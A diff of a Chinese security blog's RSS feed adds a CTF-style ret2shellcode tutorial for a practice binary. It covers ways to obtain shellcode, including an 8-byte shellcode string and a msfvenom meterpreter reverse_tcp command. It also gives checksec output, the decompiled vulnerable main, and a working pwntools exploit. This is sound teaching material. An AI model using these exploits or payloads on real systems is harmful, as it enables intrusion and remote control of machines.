@@ -6,7 +6,164 @@
         <description>Recent content on KiraPGR&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Fri, 25 Feb 2022 23:27:12 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 03 Mar 2022 05:50:08 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
+        <link>https://kira-pgr.github.io/posts/pwn5/</link>
+        <pubDate>Thu, 03 Mar 2022 05:50:08 -0500</pubDate>
+        
+        <guid>https://kira-pgr.github.io/posts/pwn5/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn5/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part5&#34;&gt;PWN! PWN! PANG! Part5&lt;/h1&gt;
+&lt;p&gt;呼～～好久没有继续更新PWN笔记了 &lt;del&gt;(最近学的Web安全的笔记也没写  逃)&lt;/del&gt;&lt;/p&gt;
+&lt;h2 id=&#34;资料投放&#34;&gt;资料投放&lt;/h2&gt;
+&lt;p&gt;老规矩，开头上资料= =&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/ERCQKjILLYdJq3hdJTJ0s0kBberJTRKHvXQ25PYHuS-8bQ?e=P2cDdb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ret2shellcode&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;shellcode&#34;&gt;ShellCode&lt;/h2&gt;
+&lt;p&gt;既然今天的话题叫做ret2shellcode,我们先来了解一下&lt;strong&gt;ShellCode&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;什么是shellcode&#34;&gt;什么是ShellCode&lt;/h3&gt;
+&lt;p&gt;shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者&lt;strong&gt;获得shell&lt;/strong&gt;而得名。shellcode常常使用机器语言编写&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;简而言之，ShellCode就是执行后可以直接getshell的代码&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;如何获取shellcode&#34;&gt;如何获取ShellCode&lt;/h3&gt;
+&lt;p&gt;获取ShellCode有很多种方法，这里简单介绍几种&lt;/p&gt;
+&lt;h4 id=&#34;利用pwntools自带函数&#34;&gt;利用PWNTools自带函数&lt;/h4&gt;
+&lt;p&gt;首先设置&lt;strong&gt;目标程序&lt;/strong&gt; 的参数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# os指操作系统，这里是Linux&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# arch指架构，64位一般是amd64，32位一般是i386&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# log_level指日志输出的等级，debug为调试模式&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后用&lt;code&gt;shellcraft.sh()&lt;/code&gt;函数获取ShellCode的&lt;strong&gt;汇编代码&lt;/strong&gt;，再调用&lt;code&gt;asm()&lt;/code&gt;变成机器码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;网上找现成的shellcode&#34;&gt;网上找现成的ShellCode&lt;/h4&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/shellcode/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ShellStorm: 一个国外ShellCode集合&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;ShellStorm中包含多种平台，多种长度，多种功能的ShellCode&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;为什么ShellCode会考虑长度？&lt;/p&gt;
+&lt;p&gt;答: 有时候栈中填入的ShellCode有长度限制&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这里举个例子，只有8字节的ShellCode&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;metasploit&#34;&gt;metasploit&lt;/h4&gt;
+&lt;p&gt;想要一个功能更强大且不想要网上到处找？&lt;/p&gt;
+&lt;p&gt;MSF的&lt;code&gt;meterpreter&lt;/code&gt;你绝对喜欢&lt;/p&gt;
+&lt;p&gt;生成ShellCode命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;Local IP Address&amp;gt; &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;Local Port&amp;gt; -f &amp;lt;language&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;自己写&#34;&gt;自己写&lt;/h4&gt;
+&lt;p&gt;建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/docs/english/13610-building-your-own-ud-shellcodes-part-1.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PDF&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pwn-pwn-pang&#34;&gt;PWN! PWN! PANG?&lt;/h2&gt;
+&lt;p&gt;本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode&lt;/p&gt;
+&lt;p&gt;大家可以先自己试试再看下面的思路分析.QwQ.&lt;/p&gt;
+&lt;p&gt;大概先提几点提示:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ShellCode写入哪里呢？&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ShellCode的地址是什么？&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ret2shellcode&#34;&gt;ret2shellcode&lt;/h2&gt;
+&lt;p&gt;先&lt;code&gt;checksec&lt;/code&gt;一下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ checksec ret2shellcode
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/pwn/桌面/ROP/ret2shellcode&amp;#39;&lt;/span&gt;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    RWX:      Has RWX segments
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;但是，我们貌似忽视了一个重要的问题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;目标机一般都是完全打开&lt;strong&gt;ASLR&lt;/strong&gt;，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。&lt;/p&gt;
+&lt;p&gt;因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 83; 
+			flex-basis: 201px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn5/1.jpg&#34; data-size=&#34;570x679&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn5/1.jpg&#34;
+			width=&#34;570&#34;
+			height=&#34;679&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn5/1_hucc68de3fc1d99772bd162ef606edf282_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn5/1_hucc68de3fc1d99772bd162ef606edf282_348427_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;啊哦，行不通了= =&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;啊哦，行不通了= =&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;当然，如果各位想尝试一下上面的思路的话，&lt;strong&gt;直接将ASLR关闭即可&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;该利用姿势&lt;strong&gt;ret2stack&lt;/strong&gt;大家可以查看&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/read/cv14181790&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;我朋友BlackRabbit的文章&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;记得留个关注呐 .QwQ.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;反汇编分析&#34;&gt;反汇编分析&lt;/h3&gt;
+&lt;p&gt;查看主函数反编译出的C代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+1Ch] [ebp-64h] BYREF
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;No system for you this time !!!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x64u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;bye bye ~&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以看出这里通过&lt;code&gt;gets()&lt;/code&gt;读入了数组&lt;code&gt;s&lt;/code&gt;,并把数组&lt;code&gt;s&lt;/code&gt;的值传给了&lt;code&gt;buf2&lt;/code&gt;，而这个&lt;code&gt;buf2&lt;/code&gt;位于&lt;code&gt;.bss&lt;/code&gt;节(看起来应该是一个全局变量)&lt;/p&gt;
+&lt;p&gt;想到这里，我们&lt;strong&gt;不禁露出了恶毒的笑容&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;我们在数组&lt;code&gt;s&lt;/code&gt;中读入的shellcode会被程序同时放在&lt;code&gt;buf2&lt;/code&gt;中，这样我们通过溢出数组s,把&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数的返回地址覆盖成&lt;code&gt;buf2&lt;/code&gt;的地址即可&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 89; 
+			flex-basis: 214px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn5/2.jpg&#34; data-size=&#34;622x696&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn5/2.jpg&#34;
+			width=&#34;622&#34;
+			height=&#34;696&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn5/2_hue7be457f48e13f9d356491fa28fefd38_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn5/2_hue7be457f48e13f9d356491fa28fefd38_391390_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;思路.QAQ.&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;思路.QAQ.&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2shellcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2shellcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;buf2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#The program has copied the string input into a global variable(stored in bss) 0x804A080 is the address of the string in bss(see in IDA) , so the shellcode is executed&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43916678/article/details/107181228&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_43916678/article/details/107181228&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_35495684/article/details/79583232&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/qq_35495684/article/details/79583232&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/read/cv14181790&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.bilibili.com/read/cv14181790&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/culinxia2707/article/details/108788113&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/culinxia2707/article/details/108788113&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Clash猫猫RCE复现(弹shell)</title>
         <link>https://kira-pgr.github.io/posts/clash_rce/</link>
         <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
@@ -363,6 +520,9 @@ generate_hta 名字
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;系统的保护措施, 和程序没有关系, &lt;strong&gt;一般默认目标机器随机化完全开启&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;可以通过&lt;code&gt;cat /proc/sys/kernel/randomize_va_space&lt;/code&gt;查看系统保护的开启情况&lt;/p&gt;
